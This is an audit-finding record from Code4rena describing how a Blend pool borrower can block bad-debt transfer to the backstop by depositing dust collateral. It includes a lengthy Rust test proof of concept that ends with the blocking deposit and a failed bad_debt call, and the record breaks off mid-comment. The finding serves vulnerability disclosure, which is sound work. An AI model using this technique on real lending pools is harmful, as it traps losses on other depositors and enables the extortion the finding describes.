{
    "id": 62080,
    "kind": "GIT",
    "auditfirm_id": 2,
    "impact": "MEDIUM",
    "finders_count": 1,
    "protocol_id": 2159,
    "title": "[M-17] Bad debt can be permanently blocked from being moved to backstop",
    "content": "\n\nWhen a position has accumulated bad debt it is supposed to be moved to the backstop and then auctioned with a bad debt auction such that the backstop covers the debt.\n\nThis can be blocked by the owner off the position by depositing a dust amount of tokens as collateral.\n\nA call to `pool::bad_debt()` should move the debt to the backstop but the following condition is checked.\n\n[`bad_debt.rs# L26-L28`](https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/pool/src/pool/bad_debt.rs# L26-L28)\n```\n\n    if !user_state.positions.collateral.is_empty() || user_state.positions.liabilities.is_empty() {\n        panic_with_error!(e, PoolError::BadRequest);\n    }\n```\n\nThere is no minimum collateral deposit so the owner of the position can add dust amount as collateral.\n\nNot only does this block bad debt from being moved, it will also block liquidation of the dust amount since the creation of liquidation auctions with `pool:new_auction()` is not possible on dust amounts.\n\nThe owner can “release” the bad debt by depositing more collateral such that it can be liquidated again but no other actor can since deposits can only be done with the permission off the owner of each positions.\n\n[`contract.rs# L427-L441`](https://github.com/code-423n4/2025-02-blend/blob/f23b3260763488f365ef6a95bfb139c95b0ed0f9/blend-contracts-v2/pool/src/contract.rs# L427-L441)\n```\n\nfn submit(\n        ....\n        spender.require_auth();\n        if from != spender {\n            from.require_auth();\n        }\n\t\t....\n    }\n```\n\nThe pool owner can use this position to blackmail others in the pool if the debt is substantial or to take payments from large backstop depositors to allow them to exit before the debt is transferred.\n\n### Proof of Concept\n\nHere is a POC showing that a user with bad debt can permanently block it from being moved to the backstop.\n```\n\n#![cfg(test)]\nuse cast::i128;\nuse pool::{AuctionData, PoolDataKey, Positions, Request, RequestType, ReserveConfig, ReserveData};\nuse soroban_fixed_point_math::FixedPoint;\nuse soroban_sdk::{\n    testutils::{Address as AddressTestTrait, Events},\n    vec,log, Address, Env, Error, FromVal, IntoVal, Symbol, TryFromVal, Val, Vec,\n};\nuse test_suites::{\n    assertions::assert_approx_eq_abs,\n    create_fixture_with_data,\n    test_fixture::{TokenIndex, SCALAR_7},\n};\n\nfn assert_fill_auction_event_no_data(\n    env: &Env,\n    event: (Address, Vec<Val>, Val),\n    pool_address: &Address,\n    auction_user: &Address,\n    auction_type: u32,\n    filler: &Address,\n    fill_pct: i128,\n) {\n    let (event_pool_address, topics, data) = event;\n    assert_eq!(event_pool_address, pool_address.clone());\n\n    assert_eq!(topics.len(), 3);\n    assert_eq!(\n        Symbol::from_val(env, &topics.get_unchecked(0)),\n        Symbol::new(env, \"fill_auction\")\n    );\n    assert_eq!(u32::from_val(env, &topics.get_unchecked(1)), auction_type);\n    assert_eq!(\n        Address::from_val(env, &topics.get_unchecked(2)),\n        auction_user.clone()\n    );\n\n    let event_data = Vec::<Val>::from_val(env, &data);\n    assert_eq!(event_data.len(), 3);\n    assert_eq!(\n        Address::from_val(env, &event_data.get_unchecked(0)),\n        filler.clone()\n    );\n    assert_eq!(i128::from_val(env, &event_data.get_unchecked(1)), fill_pct);\n    assert!(AuctionData::try_from_val(env, &event_data.get_unchecked(2)).is_ok());\n}\n\n#[test]\nfn test_liquidations() {\n    let fixture = create_fixture_with_data(true);\n    let frodo = fixture.users.get(0).unwrap();\n    let pool_fixture = &fixture.pools[0];\n\n    // accrue interest\n    let requests: Vec<Request> = vec![\n        &fixture.env,\n        Request {\n            request_type: RequestType::Borrow as u32,\n            address: fixture.tokens[TokenIndex::STABLE].address.clone(),\n            amount: 10,\n        },\n        Request {\n            request_type: RequestType::Repay as u32,\n            address: fixture.tokens[TokenIndex::STABLE].address.clone(),\n            amount: 10,\n        },\n        Request {\n            request_type: RequestType::Borrow as u32,\n            address: fixture.tokens[TokenIndex::XLM].address.clone(),\n            amount: 10,\n        },\n        Request {\n            request_type: RequestType::Repay as u32,\n            address: fixture.tokens[TokenIndex::XLM].address.clone(),\n            amount: 10,\n        },\n        Request {\n            request_type: RequestType::Borrow as u32,\n            address: fixture.tokens[TokenIndex::WETH].address.clone(),\n            amount: 10,\n        },\n        Request {\n            request_type: RequestType::Repay as u32,\n            address: fixture.tokens[TokenIndex::WETH].address.clone(),\n            amount: 10,\n        },\n    ];\n    pool_fixture.pool.submit(&frodo, &frodo, &frodo, &requests);\n\n    // Disable rate modifiers\n    let mut usdc_config: ReserveConfig = fixture.read_reserve_config(0, TokenIndex::STABLE);\n    usdc_config.reactivity = 0;\n\n    let mut xlm_config: ReserveConfig = fixture.read_reserve_config(0, TokenIndex::XLM);\n    xlm_config.reactivity = 0;\n    let mut weth_config: ReserveConfig = fixture.read_reserve_config(0, TokenIndex::WETH);\n    weth_config.reactivity = 0;\n\n    fixture.env.as_contract(&fixture.pools[0].pool.address, || {\n        let key = PoolDataKey::ResConfig(fixture.tokens[TokenIndex::STABLE].address.clone());\n        fixture\n            .env\n            .storage()\n            .persistent()\n            .set::<PoolDataKey, ReserveConfig>(&key, &usdc_config);\n        let key = PoolDataKey::ResConfig(fixture.tokens[TokenIndex::XLM].address.clone());\n        fixture\n            .env\n            .storage()\n            .persistent()\n            .set::<PoolDataKey, ReserveConfig>(&key, &xlm_config);\n        let key = PoolDataKey::ResConfig(fixture.tokens[TokenIndex::WETH].address.clone());\n        fixture\n            .env\n            .storage()\n            .persistent()\n            .set::<PoolDataKey, ReserveConfig>(&key, &weth_config);\n    });\n\n    // Create a user\n    let samwise = Address::generate(&fixture.env); //sam will be supplying XLM and borrowing STABLE\n\n    // Mint users tokens\n    fixture.tokens[TokenIndex::XLM].mint(&samwise, &(500_000 * SCALAR_7));\n    fixture.tokens[TokenIndex::WETH].mint(&samwise, &(50 * 10i128.pow(9)));\n    fixture.tokens[TokenIndex::USDC].mint(&frodo, &(100_000 * SCALAR_7));\n\n    let frodo_requests: Vec<Request> = vec![\n        &fixture.env,\n        Request {\n            request_type: RequestType::SupplyCollateral as u32,\n            address: fixture.tokens[TokenIndex::STABLE].address.clone(),\n            amount: 30_000 * 10i128.pow(6),\n        },\n    ];\n    // Supply frodo tokens\n    pool_fixture\n        .pool\n        .submit(&frodo, &frodo, &frodo, &frodo_requests);\n    // Supply and borrow sam tokens\n    let sam_requests: Vec<Request> = vec![\n        &fixture.env,\n        Request {\n            request_type: RequestType::SupplyCollateral as u32,\n            address: fixture.tokens[TokenIndex::XLM].address.clone(),\n            amount: 160_000 * SCALAR_7,\n        },\n        Request {\n            request_type: RequestType::SupplyCollateral as u32,\n            address: fixture.tokens[TokenIndex::WETH].address.clone(),\n            amount: 17 * 10i128.pow(9),\n        },\n        // Sam's max borrow is 39_200 STABLE\n        Request {\n            request_type: RequestType::Borrow as u32,\n            address: fixture.tokens[TokenIndex::STABLE].address.clone(),\n            amount: 28_000 * 10i128.pow(6),\n        }, // reduces Sam's max borrow to 14_526.31579 STABLE\n        Request {\n            request_type: RequestType::Borrow as u32,\n            address: fixture.tokens[TokenIndex::XLM].address.clone(),\n            amount: 65_000 * SCALAR_7,\n        },\n    ];\n    let sam_positions = pool_fixture\n        .pool\n        .submit(&samwise, &samwise, &samwise, &sam_requests);\n    //Utilization is now:\n    // * 36_000 / 40_000 = .9 for STABLE\n    // * 130_000 / 260_000 = .5 for XLM\n    // This equates to the following rough annual interest rates\n    //  * 31% for STABLE borrowing\n    //  * 25.11% for STABLE lending\n    //  * rate will be dragged up to rate modifier\n    //  * 6% for XLM borrowing\n    //  * 2.7% for XLM lending\n\n    // Let three months go by and call update every week\n    for _ in 0..12 {\n        // Let one week pass\n        fixture.jump(60 * 60 * 24 * 7);\n        // Update emissions\n        fixture.emitter.distribute();\n        fixture.backstop.distribute();\n        pool_fixture.pool.gulp_emissions();\n    }\n    // Start an interest auction\n    // type 2 is an interest auction\n    let auction_data = pool_fixture.pool.new_auction(\n        &2u32,\n        &fixture.backstop.address,\n        &vec![&fixture.env, fixture.lp.address.clone()],\n        &vec![\n            &fixture.env,\n            fixture.tokens[TokenIndex::STABLE].address.clone(),\n            fixture.tokens[TokenIndex::WETH].address.clone(),\n            fixture.tokens[TokenIndex::XLM].address.clone(),\n        ],\n        &100u32,\n    );\n\n    let stable_interest_lot_amount = auction_data\n        .lot\n        .get_unchecked(fixture.tokens[TokenIndex::STABLE].address.clone());\n    assert_approx_eq_abs(stable_interest_lot_amount, 256_746831, 5000000);\n    let xlm_interest_lot_amount = auction_data\n        .lot\n        .get_unchecked(fixture.tokens[TokenIndex::XLM].address.clone());\n    assert_approx_eq_abs(xlm_interest_lot_amount, 179_5067018, 5000000);\n    let weth_interest_lot_amount = auction_data\n        .lot\n        .get_unchecked(fixture.tokens[TokenIndex::WETH].address.clone());\n    assert_approx_eq_abs(weth_interest_lot_amount, 0_002671545, 5000);\n    let lp_donate_bid_amount = auction_data.bid.get_unchecked(fixture.lp.address.clone());\n    //NOTE: bid STABLE amount is seven decimals whereas reserve(and lot) STABLE has 6 decomals\n    assert_approx_eq_abs(lp_donate_bid_amount, 268_9213686, SCALAR_7);\n    assert_eq!(auction_data.block, 151);\n    let liq_pct = 30;\n    let events = fixture.env.events().all();\n    let event = vec![&fixture.env, events.get_unchecked(events.len() - 1)];\n    assert_eq!(\n        event,\n        vec![\n            &fixture.env,\n            (\n                pool_fixture.pool.address.clone(),\n                (\n                    Symbol::new(&fixture.env, \"new_auction\"),\n                    2u32,\n                    fixture.backstop.address.clone(),\n                )\n                    .into_val(&fixture.env),\n                (100u32, auction_data.clone()).into_val(&fixture.env) // event_data.into_val(&fixture.env)\n            )\n        ]\n    );\n    // Start a liquidation auction\n    let auction_data = pool_fixture.pool.new_auction(\n        &0,\n        &samwise,\n        &vec![\n            &fixture.env,\n            fixture.tokens[TokenIndex::STABLE].address.clone(),\n            fixture.tokens[TokenIndex::XLM].address.clone(),\n        ],\n        &vec![\n            &fixture.env,\n            fixture.tokens[TokenIndex::WETH].address.clone(),\n            fixture.tokens[TokenIndex::XLM].address.clone(),\n        ],\n        &liq_pct,\n    );\n    let usdc_bid_amount = auction_data\n        .bid\n        .get_unchecked(fixture.tokens[TokenIndex::STABLE].address.clone());\n    assert_approx_eq_abs(\n        usdc_bid_amount,\n        sam_positions\n            .liabilities\n            .get(0)\n            .unwrap()\n            .fixed_mul_ceil(i128(liq_pct * 100000), SCALAR_7)\n            .unwrap(),\n        SCALAR_7,\n    );\n    let xlm_bid_amount = auction_data\n        .bid\n        .get_unchecked(fixture.tokens[TokenIndex::XLM].address.clone());\n    assert_approx_eq_abs(\n        xlm_bid_amount,\n        sam_positions\n            .liabilities\n            .get(1)\n            .unwrap()\n            .fixed_mul_ceil(i128(liq_pct * 100000), SCALAR_7)\n            .unwrap(),\n        SCALAR_7,\n    );\n    let xlm_lot_amount = auction_data\n        .lot\n        .get_unchecked(fixture.tokens[TokenIndex::XLM].address.clone());\n    assert_approx_eq_abs(xlm_lot_amount, 40100_6654560, SCALAR_7);\n    let weth_lot_amount = auction_data\n        .lot\n        .get_unchecked(fixture.tokens[TokenIndex::WETH].address.clone());\n    assert_approx_eq_abs(weth_lot_amount, 4_260750195, 1000);\n    let events = fixture.env.events().all();\n    let event = vec![&fixture.env, events.get_unchecked(events.len() - 1)];\n    assert_eq!(\n        event,\n        vec![\n            &fixture.env,\n            (\n                pool_fixture.pool.address.clone(),\n                (\n                    Symbol::new(&fixture.env, \"new_auction\"),\n                    0 as u32,\n                    samwise.clone(),\n                )\n                    .into_val(&fixture.env),\n                (liq_pct, auction_data.clone()).into_val(&fixture.env)\n            )\n        ]\n    );\n\n    //let 100 blocks pass to scale up the modifier\n    fixture.jump_with_sequence(101 * 5);\n    //fill user and interest liquidation\n    let auct_type_1: u32 = 0;\n    let auct_type_2: u32 = 2;\n    let fill_requests = vec![\n        &fixture.env,\n        Request {\n            request_type: RequestType::FillUserLiquidationAuction as u32,\n            address: samwise.clone(),\n            amount: 25,\n        },\n        Request {\n            request_type: RequestType::FillUserLiquidationAuction as u32,\n            address: samwise.clone(),\n            amount: 100,\n        },\n        Request {\n            request_type: RequestType::FillInterestAuction as u32,\n            address: fixture.backstop.address.clone(), //address shouldn't matter\n            amount: 99,\n        },\n        Request {\n            request_type: RequestType::FillInterestAuction as u32,\n            address: fixture.backstop.address.clone(), //address shouldn't matter\n            amount: 100,\n        },\n        Request {\n            request_type: RequestType::Repay as u32,\n            address: fixture.tokens[TokenIndex::STABLE].address.clone(),\n            amount: usdc_bid_amount,\n        },\n    ];\n    let frodo_stable_balance = fixture.tokens[TokenIndex::STABLE].balance(&frodo);\n    let frodo_xlm_balance = fixture.tokens[TokenIndex::XLM].balance(&frodo);\n    let frodo_weth_balance = fixture.tokens[TokenIndex::WETH].balance(&frodo);\n    fixture.lp.approve(\n        &frodo,\n        &fixture.backstop.address,\n        &lp_donate_bid_amount,\n        &fixture.env.ledger().sequence(),\n    );\n    let frodo_positions_post_fill =\n        pool_fixture\n            .pool\n            .submit(&frodo, &frodo, &frodo, &fill_requests);\n    assert_approx_eq_abs(\n        frodo_positions_post_fill.collateral.get_unchecked(2),\n        weth_lot_amount\n            .fixed_div_floor(2_0000000, SCALAR_7)\n            .unwrap()\n            + 10 * 10i128.pow(9),\n        1000,\n    );\n    assert_approx_eq_abs(\n        frodo_positions_post_fill.collateral.get_unchecked(1),\n        xlm_lot_amount.fixed_div_floor(2_0000000, SCALAR_7).unwrap() + 100_000 * SCALAR_7,\n        1000,\n    );\n    assert_approx_eq_abs(\n        frodo_positions_post_fill.liabilities.get_unchecked(1),\n        xlm_bid_amount + 65_000 * SCALAR_7,\n        1000,\n    );\n    assert_approx_eq_abs(\n        frodo_positions_post_fill.liabilities.get_unchecked(0),\n        8_000 * 10i128.pow(6) + 559_285757,\n        100000,\n    );\n    let events = fixture.env.events().all();\n    assert_fill_auction_event_no_data(\n        &fixture.env,\n        events.get_unchecked(events.len() - 16),\n        &pool_fixture.pool.address,\n        &samwise,\n        auct_type_1,\n        &frodo,\n        25,\n    );\n    assert_fill_auction_event_no_data(\n        &fixture.env,\n        events.get_unchecked(events.len() - 15),\n        &pool_fixture.pool.address,\n        &samwise,\n        auct_type_1,\n        &frodo,\n        100,\n    );\n    assert_fill_auction_event_no_data(\n        &fixture.env,\n        events.get_unchecked(events.len() - 9),\n        &pool_fixture.pool.address,\n        &fixture.backstop.address,\n        auct_type_2,\n        &frodo,\n        99,\n    );\n    assert_fill_auction_event_no_data(\n        &fixture.env,\n        events.get_unchecked(events.len() - 3),\n        &pool_fixture.pool.address,\n        &fixture.backstop.address,\n        auct_type_2,\n        &frodo,\n        100,\n    );\n    assert_approx_eq_abs(\n        fixture.tokens[TokenIndex::STABLE].balance(&frodo),\n        frodo_stable_balance - usdc_bid_amount\n            + stable_interest_lot_amount\n                .fixed_div_floor(2 * 10i128.pow(6), 10i128.pow(6))\n                .unwrap(),\n        10i128.pow(6),\n    );\n    assert_approx_eq_abs(\n        fixture.tokens[TokenIndex::XLM].balance(&frodo),\n        frodo_xlm_balance\n            + xlm_interest_lot_amount\n                .fixed_div_floor(2 * SCALAR_7, SCALAR_7)\n                .unwrap(),\n        SCALAR_7,\n    );\n    assert_approx_eq_abs(\n        fixture.tokens[TokenIndex::WETH].balance(&frodo),\n        frodo_weth_balance\n            + weth_interest_lot_amount\n                .fixed_div_floor(2 * 10i128.pow(9), 10i128.pow(9))\n                .unwrap(),\n        10i128.pow(9),\n    );\n\n    //tank eth price\n    fixture.oracle.set_price_stable(&vec![\n        &fixture.env,\n        500_0000000, // eth\n        1_0000000,   // usdc\n        0_1000000,   // xlm\n        1_0000000,   // stable\n    ]);\n\n    //fully liquidate user\n    let blank_requests: Vec<Request> = vec![&fixture.env];\n    pool_fixture\n        .pool\n        .submit(&samwise, &samwise, &samwise, &blank_requests);\n    let liq_pct = 100;\n    let auction_data_2 = pool_fixture.pool.new_auction(\n        &0,\n        &samwise,\n        &vec![\n            &fixture.env,\n            fixture.tokens[TokenIndex::STABLE].address.clone(),\n            fixture.tokens[TokenIndex::XLM].address.clone(),\n        ],\n        &vec![\n            &fixture.env,\n            fixture.tokens[TokenIndex::WETH].address.clone(),\n            fixture.tokens[TokenIndex::XLM].address.clone(),\n        ],\n        &liq_pct,\n    );\n\n    let usdc_bid_amount = auction_data_2\n        .bid\n        .get_unchecked(fixture.tokens[TokenIndex::STABLE].address.clone());\n    assert_approx_eq_abs(usdc_bid_amount, 19599_872330, 100000);\n    let xlm_bid_amount = auction_data_2\n        .bid\n        .get_unchecked(fixture.tokens[TokenIndex::XLM].address.clone());\n    assert_approx_eq_abs(xlm_bid_amount, 45498_8226700, SCALAR_7);\n    let xlm_lot_amount = auction_data_2\n        .lot\n        .get_unchecked(fixture.tokens[TokenIndex::XLM].address.clone());\n    assert_approx_eq_abs(xlm_lot_amount, 139947_2453890, SCALAR_7);\n    let weth_lot_amount = auction_data_2\n        .lot\n        .get_unchecked(fixture.tokens[TokenIndex::WETH].address.clone());\n    assert_approx_eq_abs(weth_lot_amount, 14_869584990, 100000000);\n\n    //allow 250 blocks to pass\n    fixture.jump_with_sequence(251 * 5);\n    //fill user liquidation\n    let frodo_stable_balance = fixture.tokens[TokenIndex::STABLE].balance(&frodo);\n    let frodo_xlm_balance = fixture.tokens[TokenIndex::XLM].balance(&frodo);\n    let fill_requests = vec![\n        &fixture.env,\n        Request {\n            request_type: RequestType::FillUserLiquidationAuction as u32,\n            address: samwise.clone(),\n            amount: 100,\n        },\n        Request {\n            request_type: RequestType::Repay as u32,\n            address: fixture.tokens[TokenIndex::STABLE].address.clone(),\n            amount: usdc_bid_amount\n                .fixed_div_floor(2_0000000, SCALAR_7)\n                .unwrap(),\n        },\n        Request {\n            request_type: RequestType::Repay as u32,\n            address: fixture.tokens[TokenIndex::XLM].address.clone(),\n            amount: xlm_bid_amount.fixed_div_floor(2_0000000, SCALAR_7).unwrap(),\n        },\n    ];\n    let usdc_filled = usdc_bid_amount\n        .fixed_mul_floor(3_0000000, SCALAR_7)\n        .unwrap()\n        .fixed_div_floor(4_0000000, SCALAR_7)\n        .unwrap();\n    let xlm_filled = xlm_bid_amount\n        .fixed_mul_floor(3_0000000, SCALAR_7)\n        .unwrap()\n        .fixed_div_floor(4_0000000, SCALAR_7)\n        .unwrap();\n    let new_frodo_positions = pool_fixture\n        .pool\n        .submit(&frodo, &frodo, &frodo, &fill_requests);\n    assert_approx_eq_abs(\n        frodo_positions_post_fill.collateral.get(1).unwrap() + xlm_lot_amount,\n        new_frodo_positions.collateral.get(1).unwrap(),\n        SCALAR_7,\n    );\n    assert_approx_eq_abs(\n        frodo_positions_post_fill.collateral.get(2).unwrap() + weth_lot_amount,\n        new_frodo_positions.collateral.get(2).unwrap(),\n        SCALAR_7,\n    );\n    assert_approx_eq_abs(\n        frodo_positions_post_fill.liabilities.get(0).unwrap() + usdc_filled - 9147_499950,\n        new_frodo_positions.liabilities.get(0).unwrap(),\n        10i128.pow(6),\n    );\n    assert_approx_eq_abs(\n        frodo_positions_post_fill.liabilities.get(1).unwrap() + xlm_filled - 22438_6298700,\n        new_frodo_positions.liabilities.get(1).unwrap(),\n        SCALAR_7,\n    );\n    assert_approx_eq_abs(\n        frodo_stable_balance - 9799_936164,\n        fixture.tokens[TokenIndex::STABLE].balance(&frodo),\n        10i128.pow(6),\n    );\n    assert_approx_eq_abs(\n        frodo_xlm_balance - 22749_4113400,\n        fixture.tokens[TokenIndex::XLM].balance(&frodo),\n        SCALAR_7,\n    );\n\n    //transfer bad debt to the backstop\n    let blank_request: Vec<Request> = vec![&fixture.env];\n    let samwise_positions_pre_bd =\n        pool_fixture\n            .pool\n            .submit(&samwise, &samwise, &samwise, &blank_request);\n    pool_fixture.pool.bad_debt(&samwise);\n    let backstop_positions = pool_fixture.pool.submit(\n        &fixture.backstop.address,\n        &fixture.backstop.address,\n        &fixture.backstop.address,\n        &blank_request,\n    );\n    assert_eq!(\n        samwise_positions_pre_bd.liabilities.get(0).unwrap(),\n        backstop_positions.liabilities.get(0).unwrap()\n    );\n    assert_eq!(\n        samwise_positions_pre_bd.liabilities.get(1).unwrap(),\n        backstop_positions.liabilities.get(1).unwrap()\n    );\n\n    // create a bad debt auction\n    let auction_type: u32 = 1;\n    let bad_debt_auction_data = pool_fixture.pool.new_auction(\n        &1u32,\n        &fixture.backstop.address,\n        &vec![\n            &fixture.env,\n            fixture.tokens[TokenIndex::STABLE].address.clone(),\n            fixture.tokens[TokenIndex::XLM].address.clone(),\n        ],\n        &vec![&fixture.env, fixture.lp.address.clone()],\n        &100u32,\n    );\n\n    assert_eq!(bad_debt_auction_data.bid.len(), 2);\n    assert_eq!(bad_debt_auction_data.lot.len(), 1);\n\n    assert_eq!(\n        bad_debt_auction_data\n            .bid\n            .get_unchecked(fixture.tokens[TokenIndex::STABLE].address.clone()),\n        samwise_positions_pre_bd.liabilities.get(0).unwrap() //d rate 1.071330239\n    );\n    assert_eq!(\n        bad_debt_auction_data\n            .bid\n            .get_unchecked(fixture.tokens[TokenIndex::XLM].address.clone()),\n        samwise_positions_pre_bd.liabilities.get(1).unwrap() //d rate 1.013853805\n    );\n    assert_approx_eq_abs(\n        bad_debt_auction_data\n            .lot\n            .get_unchecked(fixture.lp.address.clone()),\n        6146_6087407, // lp_token value is $1.25 each\n        SCALAR_7,\n    );\n    let events = fixture.env.events().all();\n    let event = vec![&fixture.env, events.get_unchecked(events.len() - 1)];\n    assert_eq!(\n        event,\n        vec![\n            &fixture.env,\n            (\n                pool_fixture.pool.address.clone(),\n                (\n                    Symbol::new(&fixture.env, \"new_auction\"),\n                    auction_type,\n                    fixture.backstop.address.clone(),\n                )\n                    .into_val(&fixture.env),\n                (100u32, bad_debt_auction_data.clone()).into_val(&fixture.env)\n            )\n        ]\n    );\n\n    // allow 100 blocks to pass\n    fixture.jump_with_sequence(101 * 5);\n    // fill bad debt auction\n    let frodo_bstop_pre_fill = fixture.lp.balance(&frodo);\n    let backstop_bstop_pre_fill = fixture.lp.balance(&fixture.backstop.address);\n    let auction_type: u32 = 1;\n    let bad_debt_fill_request = vec![\n        &fixture.env,\n        Request {\n            request_type: RequestType::FillBadDebtAuction as u32,\n            address: fixture.backstop.address.clone(),\n            amount: 20,\n        },\n    ];\n    let post_bd_fill_frodo_positions =\n        pool_fixture\n            .pool\n            .submit(&frodo, &frodo, &frodo, &bad_debt_fill_request);\n\n    assert_eq!(\n        post_bd_fill_frodo_positions.liabilities.get(0).unwrap(),\n        new_frodo_positions.liabilities.get(0).unwrap()\n            + samwise_positions_pre_bd\n                .liabilities\n                .get(0)\n                .unwrap()\n                .fixed_mul_ceil(20, 100)\n                .unwrap(),\n    );\n    assert_eq!(\n        post_bd_fill_frodo_positions.liabilities.get(1).unwrap(),\n        new_frodo_positions.liabilities.get(1).unwrap()\n            + samwise_positions_pre_bd\n                .liabilities\n                .get(1)\n                .unwrap()\n                .fixed_mul_ceil(20, 100)\n                .unwrap(),\n    );\n    let events = fixture.env.events().all();\n    assert_fill_auction_event_no_data(\n        &fixture.env,\n        events.get_unchecked(events.len() - 1),\n        &pool_fixture.pool.address,\n        &fixture.backstop.address,\n        auction_type,\n        &frodo,\n        20,\n    );\n    assert_approx_eq_abs(\n        fixture.lp.balance(&frodo),\n        frodo_bstop_pre_fill + 614_6608740,\n        SCALAR_7,\n    );\n    assert_approx_eq_abs(\n        fixture.lp.balance(&fixture.backstop.address),\n        backstop_bstop_pre_fill - 614_6608740,\n        SCALAR_7,\n    );\n    let new_auction = pool_fixture\n        .pool\n        .get_auction(&(1 as u32), &fixture.backstop.address);\n    assert_eq!(new_auction.bid.len(), 2);\n    assert_eq!(new_auction.lot.len(), 1);\n    assert_eq!(\n        new_auction\n            .bid\n            .get_unchecked(fixture.tokens[TokenIndex::STABLE].address.clone()),\n        samwise_positions_pre_bd\n            .liabilities\n            .get(0)\n            .unwrap()\n            .fixed_mul_floor(80, 100)\n            .unwrap()\n    );\n    assert_eq!(\n        new_auction\n            .bid\n            .get_unchecked(fixture.tokens[TokenIndex::XLM].address.clone()),\n        samwise_positions_pre_bd\n            .liabilities\n            .get(1)\n            .unwrap()\n            .fixed_mul_floor(80, 100)\n            .unwrap()\n    );\n    assert_approx_eq_abs(\n        new_auction.lot.get_unchecked(fixture.lp.address.clone()),\n        bad_debt_auction_data\n            .lot\n            .get_unchecked(fixture.lp.address.clone())\n            - 1229_3217480,\n        SCALAR_7,\n    );\n    assert_eq!(new_auction.block, bad_debt_auction_data.block);\n\n    // allow another 50 blocks to pass (150 total)\n    fixture.jump_with_sequence(50 * 5);\n    // fill bad debt auction\n    let frodo_bstop_pre_fill = fixture.lp.balance(&frodo);\n    let backstop_bstop_pre_fill = fixture.lp.balance(&fixture.backstop.address);\n    let auction_type: u32 = 1;\n    let bad_debt_fill_request = vec![\n        &fixture.env,\n        Request {\n            request_type: RequestType::FillBadDebtAuction as u32,\n            address: fixture.backstop.address.clone(),\n            amount: 100,\n        },\n    ];\n    let post_bd_fill_frodo_positions =\n        pool_fixture\n            .pool\n            .submit(&frodo, &frodo, &frodo, &bad_debt_fill_request);\n    assert_eq!(\n        post_bd_fill_frodo_positions.liabilities.get(0).unwrap(),\n        new_frodo_positions.liabilities.get(0).unwrap()\n            + samwise_positions_pre_bd.liabilities.get(0).unwrap(),\n    );\n    assert_eq!(\n        post_bd_fill_frodo_positions.liabilities.get(1).unwrap(),\n        new_frodo_positions.liabilities.get(1).unwrap()\n            + samwise_positions_pre_bd.liabilities.get(1).unwrap(),\n    );\n    let events = fixture.env.events().all();\n    assert_fill_auction_event_no_data(\n        &fixture.env,\n        events.get_unchecked(events.len() - 1),\n        &pool_fixture.pool.address,\n        &fixture.backstop.address,\n        auction_type,\n        &frodo,\n        100,\n    );\n    assert_approx_eq_abs(\n        fixture.lp.balance(&frodo),\n        frodo_bstop_pre_fill + 3687_9652440,\n        SCALAR_7,\n    );\n    assert_approx_eq_abs(\n        fixture.lp.balance(&fixture.backstop.address),\n        backstop_bstop_pre_fill - 3687_9652440,\n        SCALAR_7,\n    );\n\n    //check that frodo was correctly slashed\n    let original_deposit = 50_000 * SCALAR_7;\n    let pre_withdraw_frodo_bstp = fixture.lp.balance(&frodo);\n    fixture\n        .backstop\n        .queue_withdrawal(&frodo, &pool_fixture.pool.address, &(original_deposit));\n    //jump a month\n    fixture.jump(45 * 24 * 60 * 60);\n    fixture\n        .backstop\n        .withdraw(&frodo, &pool_fixture.pool.address, &original_deposit);\n    assert_approx_eq_abs(\n        fixture.lp.balance(&frodo) - pre_withdraw_frodo_bstp,\n        original_deposit - 614_6608740 - 3687_9652440 + 268_9213686,\n        SCALAR_7,\n    );\n    fixture\n        .backstop\n        .deposit(&frodo, &pool_fixture.pool.address, &10_0000000);\n\n    // Test bad debt was burned correctly\n    // Sam re-borrows\n    let sam_requests: Vec<Request> = vec![\n        &fixture.env,\n        Request {\n            request_type: RequestType::SupplyCollateral as u32,\n            address: fixture.tokens[TokenIndex::WETH].address.clone(),\n            amount: 1 * 10i128.pow(9),\n        },\n        // Sam's max borrow is 39_200 STABLE\n        Request {\n            request_type: RequestType::Borrow as u32,\n            address: fixture.tokens[TokenIndex::STABLE].address.clone(),\n            amount: 100 * 10i128.pow(6),\n        }, // reduces Sam's max borrow to 14_526.31579 STABLE\n    ];\n    let sam_positions = pool_fixture\n        .pool\n        .submit(&samwise, &samwise, &samwise, &sam_requests);\n\n    // Nuke eth price more\n    fixture.oracle.set_price_stable(&vec![\n        &fixture.env,\n        10_0000000, // eth\n        1_0000000,  // usdc\n        0_1000000,  // xlm\n        1_0000000,  // stable\n    ]);\n\n    // Liquidate sam\n    let liq_pct: u32 = 100;\n    let auction_data = pool_fixture.pool.new_auction(\n        &0,\n        &samwise,\n        &vec![\n            &fixture.env,\n            fixture.tokens[TokenIndex::STABLE].address.clone(),\n        ],\n        &vec![\n            &fixture.env,\n            fixture.tokens[TokenIndex::WETH].address.clone(),\n        ],\n        &liq_pct,\n    );\n    let usdc_bid_amount = auction_data\n        .bid\n        .get_unchecked(fixture.tokens[TokenIndex::STABLE].address.clone());\n    assert_approx_eq_abs(\n        usdc_bid_amount,\n        sam_positions\n            .liabilities\n            .get(0)\n            .unwrap()\n            .fixed_mul_ceil(i128(liq_pct * 100000), SCALAR_7)\n            .unwrap(),\n        SCALAR_7,\n    );\n\n    //jump 400 blocks\n    fixture.jump_with_sequence(401 * 5);\n    //fill liq\n    let bad_debt_fill_request = vec![\n        &fixture.env,\n        Request {\n            request_type: RequestType::FillUserLiquidationAuction as u32,\n            address: samwise.clone(),\n            amount: 100,\n        },\n    ];\n\n    // ----------------------------- START OF POC -------------------------\n\n    pool_fixture\n        .pool\n        .submit(&frodo, &frodo, &frodo, &bad_debt_fill_request);\n\n    let positions = pool_fixture.pool.get_positions(&samwise);\n    println!(\"liabilities before: {:?}\", positions.liabilities);\n    println!(\"collateral before: {:?}\", positions.collateral);\n\n    // Sam makes small deposit to block bad debt transfer\n    let sam_eth_dust_deposit_request: Vec<Request> = vec![\n        &fixture.env,\n        Request {\n            request_type: RequestType::SupplyCollateral as u32,\n            address: fixture.tokens[TokenIndex::WETH].address.clone(),\n            //amount: 2,\n            amount: 2,\n        },\n    ];\n\n    pool_fixture\n        .pool\n        .submit(&samwise, &samwise, &samwise, &sam_eth_dust_deposit_request);\n\n    pool_fixture\n        .pool\n        .submit(&samwise, &samwise, &samwise, &blank_request);\n\n    let result = pool_fixture.pool.try_bad_debt(&samwise);\n    assert!(result.is_err());\n\n    let positions = pool_fixture.pool.get_positions(&samwise);\n\n    println!(\"liabilities after attempt to move bad_debt: {:?}\", positions.liabilities);\n    println!(\"collateral after attempt to move bad_debt: {:?}\", positions.collateral);\n\n    // By depositing dust collateral the user can 